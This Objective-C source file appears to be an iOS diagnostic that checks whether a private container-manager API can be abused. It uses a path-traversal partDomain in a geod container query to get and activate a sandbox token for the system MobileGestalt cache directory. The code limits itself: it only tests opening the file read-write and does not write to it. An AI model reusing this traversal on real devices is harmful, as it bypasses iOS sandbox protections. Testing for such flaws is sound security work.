// SPDX-License-Identifier: GPL-3.0-only
// Independently implemented diagnostic using the public API research in:
// https://github.com/0xjohnnydev/Geod-MCM-PoC/tree/1d64e79d326dd8643a7b70dc1899dd3c07f69591
// The upstream claims iOS 26 support; this does not establish 23G71 support.
#import "MGContainerAccessCheck.h"
#import <dlfcn.h>
#import <stdbool.h>
#import <stdint.h>
#import <stdlib.h>
#import <xpc/xpc.h>

static NSString *const MGCheckDirectory =
    @"/private/var/containers/Shared/SystemGroup/"
     "systemgroup.com.apple.mobilegestaltcache/Library/Caches";

typedef struct {
    void *(*create)(void);
    void (*setClass)(void *, uint64_t);
    void (*setIdentifiers)(void *, xpc_object_t);
    void (*setGroups)(void *, xpc_object_t);
    void (*setFlags)(void *, uint64_t);
    void (*setPart)(void *, uint64_t);
    void (*setPartDomain)(void *, const char *);
    void *(*result)(void *);
    void (*freeQuery)(void *);
    void *(*copyObject)(void *);
    void (*freeObject)(void *);
    const char *(*path)(void *);
    char *(*copyToken)(void *);
    bool (*activate)(void *, bool);
} MGCheckAPI;

static NSString *MGCheckNormalizedPath(const char *raw) {
    if (!raw) return @"";
    NSString *path = [[NSString stringWithUTF8String:raw] stringByStandardizingPath];
    if ([path hasPrefix:@"/var/"]) path = [@"/private" stringByAppendingString:path];
    return path ?: @"";
}

// Kept separate from symbol loading so GitHub tests can exercise denial,
// path validation and lease cleanup without calling any private system API.
static BOOL MGCheckUsingAPI(MGCheckAPI api, void (^record)(NSString *),
                           MGCheckFileState (^inspect)(NSString *)) {
    MGCheckFileState initial = inspect(@"初始文件权限");
    if (initial == MGCheckFileStateAvailable) {
        record(@"初始检测已能读写打开；未尝试新授权，不能归因于本轮路线。");
        return NO;
    }
    if (initial != MGCheckFileStateWriteDenied) {
        record(@"未获得明确的只读权限基线，停止授权检测。");
        return NO;
    }
    if (!api.create || !api.setClass || !api.setFlags || !api.setPart ||
        !api.result || !api.freeQuery || !api.copyObject || !api.freeObject ||
        !api.path || !api.copyToken || !api.activate) {
        record(@"缺少必要的容器查询接口；停止检测。");
        return NO;
    }

    for (NSUInteger route = 0; route < 2; route++) {
        BOOL geod = route == 0;
        record(geod ? @"路线 A：geod class 12 / partDomain"
                    : @"路线 B：MobileGestalt class 13 / part 3");
        if ((geod && (!api.setIdentifiers || !api.setPartDomain)) ||
            (!geod && !api.setGroups)) {
            record(@"本路线所需接口不可用。");
            continue;
        }
        void *query = api.create();
        if (!query) {
            record(@"无法创建容器查询。");
            continue;
        }
        void *object = NULL;
        BOOL activationAttempted = NO;
        BOOL passed = NO;
        @try {
            api.setClass(query, geod ? 12 : 13);
            xpc_object_t identifier = xpc_string_create(geod ? "com.apple.geod"
                : "systemgroup.com.apple.mobilegestaltcache");
            if (geod) api.setIdentifiers(query, identifier);
            else api.setGroups(query, identifier);
#if !OS_OBJECT_USE_OBJC
            xpc_release(identifier);
#endif
            api.setFlags(query, UINT64_C(0x8100000000));
            api.setPart(query, 3);
            if (geod) api.setPartDomain(query,
                "../../../../../../containers/Shared/SystemGroup/"
                "systemgroup.com.apple.mobilegestaltcache/Library/Caches");

            void *borrowed = api.result(query);
            object = borrowed ? api.copyObject(borrowed) : NULL;
            if (!object) {
                record(@"查询未返回可用容器；可能被系统拒绝。");
            } else if (![MGCheckNormalizedPath(api.path(object)) isEqualToString:MGCheckDirectory]) {
                // Never print unexpected container paths or consume their tokens.
                record(@"返回目录与固定 MobileGestalt 目标不一致；拒绝激活。");
            } else {
                record(@"返回目录核对通过。");
                char *token = api.copyToken(object);
                BOOL hasToken = token && token[0] != '\0';
                free(token); // Token contents never enter a report.
                if (!hasToken) {
                    record(@"系统未签发非空 sandbox token。");
                } else {
                    activationAttempted = YES;
                    BOOL activated = api.activate(object, false);
                    record(activated ? @"临时权限激活成功。" : @"临时权限激活失败。");
                    BOOL opened = inspect(@"授权期间实际文件检测") == MGCheckFileStateAvailable;
                    passed = activated && opened;
                }
            }
        } @finally {
            // The copied object owns the activated extension. Release it before
            // checking revocation and before attempting another independent route.
            if (object) api.freeObject(object);
            api.freeQuery(query);
        }
        if (activationAttempted && inspect(@"释放临时权限后复检") != MGCheckFileStateWriteDenied) {
            record(@"释放后未确认读写打开被权限拒绝；停止后续检测。请退出并重开应用。");
            return NO;
        }
        if (passed) {
            record(@"本路线通过：临时授权期间可读写打开，释放后读写打开被拒绝。尚未测试写入。");
            return YES;
        }
    }
    return NO;
}

BOOL MGCheckContainerRoutes(void (^record)(NSString *), MGCheckFileState (^inspect)(NSString *)) {
    void *library = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW | RTLD_LOCAL);
    if (!library) {
        record(@"无法载入容器管理库。");
        return NO;
    }
    MGCheckAPI api = {0};
#define MG_LOAD(field, symbol) do { \
    api.field = (__typeof(api.field))dlsym(library, symbol); \
    if (!api.field) record([@"接口不可用：" stringByAppendingString: \
        [NSString stringWithUTF8String:symbol]]); \
} while (0)
    MG_LOAD(create, "container_query_create");
    MG_LOAD(setClass, "container_query_set_class");
    MG_LOAD(setIdentifiers, "container_query_set_identifiers");
    MG_LOAD(setGroups, "container_query_set_group_identifiers");
    MG_LOAD(setFlags, "container_query_operation_set_flags");
    MG_LOAD(setPart, "container_query_operation_set_part");
    MG_LOAD(setPartDomain, "container_query_operation_set_part_domain");
    MG_LOAD(result, "container_query_get_single_result");
    MG_LOAD(freeQuery, "container_query_free");
    MG_LOAD(copyObject, "container_object_copy");
    MG_LOAD(freeObject, "container_object_free");
    MG_LOAD(path, "container_object_get_path");
    MG_LOAD(copyToken, "container_copy_sandbox_token");
    MG_LOAD(activate, "container_object_sandbox_extension_activate");
#undef MG_LOAD
    @try {
        return MGCheckUsingAPI(api, record, inspect);
    } @finally {
        dlclose(library);
    }
}
